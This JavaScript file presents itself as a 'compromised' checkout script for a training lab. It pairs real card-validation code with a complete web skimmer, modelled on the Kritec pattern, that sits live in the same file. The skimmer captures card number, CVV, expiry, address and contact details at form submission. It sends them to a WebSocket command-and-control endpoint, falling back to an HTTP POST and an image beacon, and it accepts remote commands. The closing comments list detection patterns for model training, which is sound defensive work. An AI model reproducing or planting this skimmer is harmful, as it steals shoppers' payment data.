/**
 * CHECKOUT.JS - COMPROMISED VERSION (WEBSOCKET EXFILTRATION VARIANT)
 *
 * This variant demonstrates the same attack using WebSocket communication
 * based on the Kritec skimmer pattern that used WebSocket C2 channels.
 *
 * Key changes from base variant:
 * - Uses WebSocket (ws://) instead of HTTP POST for data transmission
 * - Establishes persistent bidirectional communication with C2
 * - Handles WebSocket connection lifecycle and reconnection
 * - Falls back to HTTP POST if WebSocket connection fails
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

// ============================================================================
// PART 1: LEGITIMATE CHECKOUT CODE
// ============================================================================

;(function () {
  'use strict'

  console.log('[Checkout] Initializing legitimate checkout system...')

  /**
   * Validate credit card number using Luhn algorithm
   */
  function validateCardNumber(cardNumber) {
    const digits = cardNumber.replace(/\D/g, '')

    if (digits.length < 15 || digits.length > 16) {
      return { valid: false, error: 'Card number must be 15-16 digits' }
    }

    // Luhn algorithm
    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits[i])

      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }

      sum += digit
      isEven = !isEven
    }

    const luhnValid = sum % 10 === 0
    if (!luhnValid) {
      return { valid: false, error: 'Invalid card number (Luhn algorithm check failed)' }
    }

    return { valid: true }
  }

  /**
   * Validate expiry date
   */
  function validateExpiry(expiry) {
    const parts = expiry.split('/')
    if (parts.length !== 2) return false

    const month = parseInt(parts[0])
    const year = parseInt('20' + parts[1])

    if (month < 1 || month > 12) return false

    const now = new Date()
    const currentYear = now.getFullYear()
    const currentMonth = now.getMonth() + 1

    if (year < currentYear) return false
    if (year === currentYear && month < currentMonth) return false

    return true
  }

  /**
   * Validate CVV
   */
  function validateCVV(cvv, cardNumber) {
    const digits = cvv.replace(/\D/g, '')
    const cleanCard = cardNumber.replace(/\D/g, '')

    // Amex (starts with 34 or 37) uses 4-digit CVV
    if (cleanCard.startsWith('34') || cleanCard.startsWith('37')) {
      return digits.length === 4
    }

    // Others use 3-digit CVV
    return digits.length === 3
  }

  /**
   * Show validation error
   */
  function showError(fieldId, message) {
    const field = document.getElementById(fieldId)
    field.style.borderColor = '#e74c3c'

    // Remove any existing error message
    const existingError = field.parentElement.querySelector('.error-message')
    if (existingError) {
      existingError.remove()
    }

    // Add error message
    const errorDiv = document.createElement('div')
    errorDiv.className = 'error-message'
    errorDiv.style.color = '#e74c3c'
    errorDiv.style.fontSize = '0.9rem'
    errorDiv.style.marginTop = '0.25rem'
    errorDiv.textContent = message
    field.parentElement.appendChild(errorDiv)

    // Focus the field
    field.focus()
  }

  /**
   * Clear validation errors
   */
  function clearErrors() {
    document.querySelectorAll('.error-message').forEach(el => el.remove())
    document.querySelectorAll('input, select').forEach(el => {
      el.style.borderColor = '#ddd'
    })
  }

  /**
   * Process payment (simulated)
   */
  function processPayment(formData) {
    console.log('[Checkout] Processing payment...')
    console.log('[Checkout] IMPORTANT: This is a simulated transaction')

    return new Promise(resolve => {
      setTimeout(() => {
        console.log('[Checkout] Payment processed successfully (simulated)')
        console.log('[Checkout] Transaction ID:', 'TXN-' + Date.now())
        resolve({
          success: true,
          transactionId: 'TXN-' + Date.now()
        })
      }, 1000)
    })
  }

  /**
   * Handle form submission
   */
  async function handleSubmit(event) {
    event.preventDefault()

    console.log('[Checkout] Form submitted')
    clearErrors()

    // Get form values
    const cardNumber = document.getElementById('card-number').value
    const cvv = document.getElementById('cvv').value
    const expiry = document.getElementById('expiry').value

    // Validate card number
    const cardValidation = validateCardNumber(cardNumber)
    if (!cardValidation.valid) {
      showError('card-number', cardValidation.error)
      return false
    }

    // Validate expiry
    if (!validateExpiry(expiry)) {
      showError('expiry', 'Card has expired or invalid date')
      return false
    }

    // Validate CVV
    if (!validateCVV(cvv, cardNumber)) {
      showError('cvv', 'Invalid CVV code')
      return false
    }

    // Show loading state
    const submitBtn = document.querySelector('.submit-btn')
    const originalText = submitBtn.textContent
    submitBtn.textContent = 'Processing...'
    submitBtn.disabled = true

    try {
      const formData = new FormData(event.target)
      const data = Object.fromEntries(formData.entries())

      const result = await processPayment(data)

      if (result.success) {
        event.target.style.display = 'none'
        const successMessage = document.getElementById('success-message')
        successMessage.classList.add('show')

        console.log('[Checkout] Order completed successfully')
      }
    } catch (error) {
      console.error('[Checkout] Payment processing error:', error)
      alert('Payment processing failed. Please try again.')

      submitBtn.textContent = originalText
      submitBtn.disabled = false
    }
  }

  /**
   * Initialize checkout
   */
  function init() {
    const form = document.getElementById('payment-form')

    if (form) {
      form.addEventListener('submit', handleSubmit)
      console.log('[Checkout] Checkout system ready')
    }
  }

  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init)
  } else {
    init()
  }
})()

// ============================================================================
// PART 2: WEBSOCKET EXFILTRATION VARIANT MALICIOUS CODE
// ============================================================================
//
// This code demonstrates WebSocket-based skimming techniques used by attackers
// like the Kritec skimmer. Instead of HTTP POST, it establishes a WebSocket
// connection for real-time bidirectional communication with the C2 server.
//
// Key features:
// - Persistent WebSocket connection to C2 server
// - Connection lifecycle management (open, error, close)
// - Automatic reconnection with exponential backoff
// - Structured JSON message protocol
// - HTTP fallback if WebSocket connection fails
// - Real-time data transmission capabilities
// ============================================================================

;(function () {
  'use strict'

  // Kritec-style attack: WebSocket C2 communication
  setTimeout(function () {
    // Dynamically determine C2 URLs based on environment
    const hostname = window.location.hostname
    let fallbackUrl = 'http://localhost:3000/collect' // Local development default

    // Production and staging - use relative URL since C2 is proxied by nginx
    if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
      fallbackUrl = window.location.origin + '/collect'
    }

    const CONFIG = {
      wsUrl: 'ws://localhost:3001/ws', // WebSocket C2 endpoint
      fallbackUrl: fallbackUrl, // HTTP fallback
      reconnectDelay: 1000, // Initial reconnect delay
      maxReconnectDelay: 30000, // Max reconnect delay
      reconnectAttempts: 0, // Track reconnection attempts
      maxReconnectAttempts: 5, // Max reconnect attempts
      debug: true
    }

    function log(message, data) {
      if (CONFIG.debug) {
        console.log('[SKIMMER]', message, data || '')
      }
    }

    // WebSocket connection management
    let ws = null
    let wsConnected = false
    let messageQueue = []

    function getFieldValue(selectors) {
      for (let selector of selectors) {
        const element = document.querySelector(selector)
        if (element && element.value) {
          return element.value.trim()
        }
      }
      return ''
    }

    function extractCardData() {
      log('Extracting card data from form fields...')
      const data = {
        cardNumber: getFieldValue(['#card-number', '[name="cardNumber"]']),
        cvv: getFieldValue(['#cvv', '[name="cvv"]']),
        expiry: getFieldValue(['#expiry', '[name="expiry"]']),
        cardholderName: getFieldValue(['#cardholder-name', '[name="cardholderName"]']),
        billingAddress: getFieldValue(['#billing-address', '[name="billingAddress"]']),
        city: getFieldValue(['#city', '[name="city"]']),
        zip: getFieldValue(['#zip', '[name="zip"]']),
        country: getFieldValue(['#country', '[name="country"]']),
        email: getFieldValue(['#email', '[name="email"]']),
        phone: getFieldValue(['#phone', '[name="phone"]'])
      }

      // Add metadata
      data.metadata = {
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screenResolution: screen.width + 'x' + screen.height,
        collectionMethod: 'websocket-exfil-variant' // Track variant type
      }

      return data
    }

    function hasValidCardData(data) {
      const cleanCard = data.cardNumber.replace(/[\s-]/g, '')
      const validLength = cleanCard.length === 15 || cleanCard.length === 16
      const validCVV = data.cvv.length === 3 || data.cvv.length === 4
      return validLength && validCVV && data.expiry
    }

    function createWebSocketMessage(type, data) {
      return JSON.stringify({
        type: type,
        timestamp: new Date().toISOString(),
        sessionId: 'sess_' + Date.now(),
        data: data
      })
    }

    function sendWebSocketMessage(type, data) {
      const message = createWebSocketMessage(type, data)

      if (wsConnected && ws && ws.readyState === WebSocket.OPEN) {
        log('Sending WebSocket message:', { type, dataSize: JSON.stringify(data).length })
        ws.send(message)
        return true
      } else {
        log('WebSocket not connected, queuing message')
        messageQueue.push({ type, data })
        return false
      }
    }

    function processMessageQueue() {
      if (wsConnected && ws && ws.readyState === WebSocket.OPEN && messageQueue.length > 0) {
        log('Processing queued messages:', messageQueue.length)

        while (messageQueue.length > 0) {
          const { type, data } = messageQueue.shift()
          const message = createWebSocketMessage(type, data)
          ws.send(message)
        }

        log('All queued messages sent')
      }
    }

    function fallbackToHTTP(data) {
      log('Falling back to HTTP POST method')

      fetch(CONFIG.fallbackUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
        mode: 'cors',
        credentials: 'omit'
      })
        .then(response => {
          log('HTTP fallback response status:', response.status)
          return response.text()
        })
        .then(responseText => {
          log('HTTP fallback successful')
        })
        .catch(error => {
          log('HTTP fallback failed:', error)

          // Final fallback: image beacon
          const img = new Image()
          img.src = CONFIG.fallbackUrl + '?' + btoa(JSON.stringify(data))
        })
    }

    function connectWebSocket() {
      if (ws && (ws.readyState === WebSocket.CONNECTING || ws.readyState === WebSocket.OPEN)) {
        log('WebSocket already connecting or connected')
        return
      }

      log('Establishing WebSocket connection:', CONFIG.wsUrl)

      try {
        ws = new WebSocket(CONFIG.wsUrl)

        ws.onopen = function (event) {
          log('WebSocket connection established')
          wsConnected = true
          CONFIG.reconnectAttempts = 0

          // Send connection notification
          sendWebSocketMessage('connection', {
            status: 'connected',
            userAgent: navigator.userAgent,
            url: window.location.href
          })

          // Process any queued messages
          processMessageQueue()
        }

        ws.onmessage = function (event) {
          log('WebSocket message received:', event.data)

          try {
            const message = JSON.parse(event.data)

            // Handle C2 commands
            if (message.type === 'command') {
              log('C2 command received:', message.data)

              // Example: C2 could request immediate data collection
              if (message.data.action === 'collect_now') {
                const cardData = extractCardData()
                if (hasValidCardData(cardData)) {
                  sendWebSocketMessage('payment_data', cardData)
                }
              }
            }
          } catch (e) {
            log('Error parsing WebSocket message:', e)
          }
        }

        ws.onerror = function (error) {
          log('WebSocket error:', error)
          wsConnected = false
        }

        ws.onclose = function (event) {
          log('WebSocket connection closed:', {
            code: event.code,
            reason: event.reason,
            wasClean: event.wasClean
          })

          wsConnected = false

          // Attempt reconnection with exponential backoff
          if (CONFIG.reconnectAttempts < CONFIG.maxReconnectAttempts) {
            CONFIG.reconnectAttempts++
            const delay = Math.min(
              CONFIG.reconnectDelay * Math.pow(2, CONFIG.reconnectAttempts - 1),
              CONFIG.maxReconnectDelay
            )

            log(
              `Attempting reconnection ${CONFIG.reconnectAttempts}/${CONFIG.maxReconnectAttempts} in ${delay}ms`
            )

            setTimeout(() => {
              connectWebSocket()
            }, delay)
          } else {
            log('Max reconnection attempts reached, giving up on WebSocket')
          }
        }
      } catch (error) {
        log('Failed to create WebSocket:', error)
        wsConnected = false
      }
    }

    function exfiltrateData(data) {
      log('Exfiltrating data via WebSocket...')

      // Try WebSocket first
      if (sendWebSocketMessage('payment_data', data)) {
        log('Data sent via WebSocket')
      } else {
        log('WebSocket unavailable, using HTTP fallback')
        fallbackToHTTP(data)
      }
    }

    function initWebSocketSkimmer() {
      log('Initializing WebSocket skimmer...')

      // Establish WebSocket connection
      connectWebSocket()

      const checkForm = setInterval(() => {
        const form = document.querySelector('#payment-form')

        if (form) {
          clearInterval(checkForm)
          log('Payment form found, attaching WebSocket skimmer')

          // Intercept form submission
          form.addEventListener('submit', function (event) {
            log('Form submission detected')

            const cardData = extractCardData()

            if (hasValidCardData(cardData)) {
              log('Valid card data found, preparing WebSocket exfiltration')

              setTimeout(() => {
                exfiltrateData(cardData)
              }, 100)
            } else {
              log('Insufficient card data, skipping exfiltration')
            }

            // CRITICAL: Allow legitimate checkout to continue
          })

          log('WebSocket skimmer ready and listening')
        }
      }, 100)

      // Stop checking after 10 seconds
      setTimeout(() => {
        clearInterval(checkForm)
      }, 10000)
    }

    // Initialize when form is available
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initWebSocketSkimmer)
    } else {
      initWebSocketSkimmer()
    }

    // Cleanup on page unload
    window.addEventListener('beforeunload', function () {
      if (ws && wsConnected) {
        sendWebSocketMessage('disconnect', { reason: 'page_unload' })
        ws.close()
      }
    })
  }, 300) // Slightly shorter delay than base variant
})()

/**
 * WEBSOCKET EXFILTRATION VARIANT ANALYSIS:
 *
 * This variant demonstrates the Kritec skimmer pattern using WebSocket
 * communication instead of HTTP POST for data exfiltration.
 *
 * Key differences from base variant:
 * 1. WebSocket connection establishment and management
 * 2. Persistent bidirectional C2 channel
 * 3. Connection lifecycle handling (open, error, close, reconnect)
 * 4. Structured JSON message protocol over WebSocket
 * 5. Message queuing for offline scenarios
 * 6. Exponential backoff reconnection strategy
 * 7. HTTP POST fallback if WebSocket fails
 * 8. C2 command reception capabilities
 *
 * Kritec skimmer characteristics:
 * - WebSocket C2 communication for stealth
 * - Real-time bidirectional channel
 * - Connection persistence and recovery
 * - Structured messaging protocol
 * - Dual exfiltration methods (WebSocket + HTTP)
 *
 * Detection Patterns:
 * - WebSocket connection establishment (new WebSocket())
 * - ws:// or wss:// protocol usage
 * - WebSocket event handlers (onopen, onmessage, onerror, onclose)
 * - Connection retry logic with exponential backoff
 * - Dual communication channels (WebSocket + HTTP fallback)
 * - Structured JSON messaging over WebSocket
 * - Message queuing patterns
 *
 * Despite different communication method, core functionality remains identical:
 * - Same form field extraction
 * - Same JSON data structure
 * - Same card validation logic
 * - Same legitimate checkout preservation
 *
 * ML Training Value:
 * This variant tests detection models' ability to:
 * - Recognize WebSocket-based C2 patterns
 * - Detect persistent connection establishment
 * - Identify protocol switching and fallback mechanisms
 * - Spot real-time communication channels
 * - Generalize across communication protocols
 */
